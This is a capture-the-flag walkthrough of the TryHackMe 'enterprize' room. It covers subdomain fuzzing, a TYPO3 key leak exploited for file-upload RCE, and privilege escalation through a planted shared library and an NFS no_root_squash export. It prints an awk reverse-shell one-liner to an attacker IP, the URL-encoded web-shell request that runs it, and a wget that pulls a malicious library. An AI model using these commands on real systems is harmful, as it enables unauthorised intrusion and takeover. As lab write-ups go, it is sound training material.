# enterprize

https://tryhackme.com/room/enterprize

## Scan

![image](https://github.com/Roqlane/enterprise/assets/78229498/300f7df1-b51d-4a95-bc79-c7490746de91)

There is 2 open ports: ssh and http

## Web enumeration

![image](https://github.com/Roqlane/enterprise/assets/78229498/f9959969-f0bf-4b82-b9bd-166a7a43eef9)

Well, let's see what we got:

`gobuster dir -u "http://10.10.40.31" -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -x .php, .txt`

![image](https://github.com/Roqlane/enterprise/assets/78229498/823e8138-0c0f-459b-ae69-0bfa52b80de8)

![image](https://github.com/Roqlane/enterprise/assets/78229498/51c177b4-cef4-455b-9962-84bcee7fb6a1)

So we have a config for the typo3 CMS but even after trying other wordlists, this is all I get. Then, are there subdomains on the machine ? Let's find out.

`wfuzz -u "http://enterprize.thm" -H "Host:FUZZ.enterprize.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`

![image](https://github.com/Roqlane/enterprise/assets/78229498/7072e61b-0b6b-4d0a-8d2a-e6a6b38cd1e8)


Let's filter out the responses that have the same number of words.

`wfuzz -u "http://enterprize.thm" -H "Host:FUZZ.enterprize.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -c --hw 5`

![image](https://github.com/Roqlane/enterprise/assets/78229498/d62aea2c-4393-4b8f-b73c-8f3ff87f1e87)

So this subdomain looks like this. This is effectively a TYPO3 CMS.

![image](https://github.com/Roqlane/enterprise/assets/78229498/f58d1b1e-67db-4749-ad40-5350f1b41fac)

Continuing our enumeration we find a very insteresting file that give us an encryption key that may be used for an exploit.

![image](https://github.com/Roqlane/enterprise/assets/78229498/5d3058ff-cf43-4650-a3cd-8830cbaf071c)

![image](https://github.com/Roqlane/enterprise/assets/78229498/cf97208f-f496-4eb9-86a2-9551271d3bfd)

![image](https://github.com/Roqlane/enterprise/assets/78229498/95e194a3-ee8a-456f-aceb-708daa787058)


I found this tool that allows an enumeration of TYPO3 vulnerabilities.

TODO: typo3 scan

## Webshell

Then after hours of research, I found this article speaking about an RCE vulnerability https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution. Basically, all we have to do is to try to upload a file in /fileadmin/_temp_/ directory.
To do so we first have to use guzzle to encode our payload and path we want our file to be uploaded at. Then we create a php script that hashes our payload using hmac function and the encryption key. Then, I used burpsuite to intercept the request of the form (located at http://maintest.enterprize.thm/index.php?id=38) and concatenated the payload and the hash in the request.
I tried a few things but it didn't work:

![image](https://github.com/Roqlane/enterprise/assets/78229498/95d63905-8327-4fa5-9af4-aa454262d8e2)

![image](https://github.com/Roqlane/enterprise/assets/78229498/86885981-7cd3-4c7a-ae3d-6bb3a16025d0)

![image](https://github.com/Roqlane/enterprise/assets/78229498/7bdfe646-1dfe-4643-88ab-072f69d875d5)

Hmmmm, maybe a php version problem. It doesn't change anything on the hmac version but maybe it changes the result of the guzzle. Changing my php version to 7.2. I first thought it hasn't change anything to the payload but after double checking the results were quite different so I give it a try:

![image](https://github.com/Roqlane/enterprise/assets/78229498/c5af8fc2-090d-434d-8262-7f009e3f4abf)

![image](https://github.com/Roqlane/enterprise/assets/78229498/f03782f6-c57d-45e0-b338-5776a279c1f8)

It works !!! Now we have to get our reverse shell, testing several commands, it was the awk one who worked.

`awk 'BEGIN {s = "/inet/tcp/0/10.9.164.243/6969"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`

Encode it and then

`http://maintest.enterprize.thm/fileadmin/_temp_/kitty.php?1=awk%20%27BEGIN%20%7Bs%20%3D%20%22%2Finet%2Ftcp%2F0%2F10.9.164.243%2F6969%22%3B%20while(42)%20%7B%20do%7B%20printf%20%22shell%3E%22%20%7C%26%20s%3B%20s%20%7C%26%20getline%20c%3B%20if(c)%7B%20while%20((c%20%7C%26%20getline)%20%3E%200)%20print%20%240%20%7C%26%20s%3B%20close(c)%3B%20%7D%20%7D%20while(c%20!%3D%20%22exit%22)%20close(s)%3B%20%7D%7D%27%20%2Fdev%2Fnull`

![image](https://github.com/Roqlane/enterprise/assets/78229498/405254c8-a683-4bb9-b872-f5095e64efb0)


## Privesc to john

Enumerating the machine, we find a program located at /home/john/develop

![image](https://github.com/Roqlane/enterprise/assets/78229498/21e38a2c-b0e0-4f3e-a823-e1a0cee31f7d)

It doesn't seem to do something interesting, let's run ldd to see which libraries, it is using.

![image](https://github.com/Roqlane/enterprise/assets/78229498/1f8f6673-cd96-44ee-bb45-2589bf3b538c)

![image](https://github.com/Roqlane/enterprise/assets/78229498/0f77e014-cdab-443e-a9fd-aede982832bc)


While doing all these steps, I found that the modification time of the result.txt file changed. So we must have cron job running in the background. Knowing all these we then have to create a libcustom.so that will hold a reverse shell and create the test.conf.

![image](https://github.com/Roqlane/enterprise/assets/78229498/3b95981a-ee40-4f8c-80f9-61ce98d0a64a)

`echo "/home/john/develop/" > /home/john/develop/test.conf`

I ran a http server in order to retrieve the new libcustom

`cd /home/john/develop/; wget http://MY_IP_ADDRESS/libcustom.so`

![image](https://github.com/Roqlane/enterprise/assets/78229498/0339b28a-3df8-42ff-9c62-3f6a6ce17b02)

After few minutes

![image](https://github.com/Roqlane/enterprise/assets/78229498/c51cee60-06a6-42e1-a7cb-5cfd972f121e)


## Get the root

We see that the port 2049 (nfs) is open, displaying the /etc/exports we found that the /var/nfs is configured with the no_root_squash option

![image](https://github.com/Roqlane/enterprise/assets/78229498/0de63e6e-58db-4fcd-9979-76ec68c38bc6)

![image](https://github.com/Roqlane/enterprise/assets/78229498/73bd413d-b0ef-49bd-ad46-78c4ffbf6a6a)

Since the nfs service is running on localhost, we need to do a port forwarding with our machine. To make the process work, we first need to create a ssh config with the user john. 

`echo "YOUR KEY" > .ssh/authorized_keys`

On your machine:

`ssh -N -L 127.0.0.1:2049:127.0.0.1:2049 john@IP_ADDRESS`

`sudo mount -t nfs -o port=2049 127.0.0.1:/var/nfs /tmp/kitty`

Create the suid file.

![image](https://github.com/Roqlane/enterprise/assets/78229498/7e59a75d-a3d7-4662-a0c2-12f1d94448d9)

![image](https://github.com/Roqlane/enterprise/assets/78229498/60884e32-f443-4e0a-a9e5-e9018c6da548)






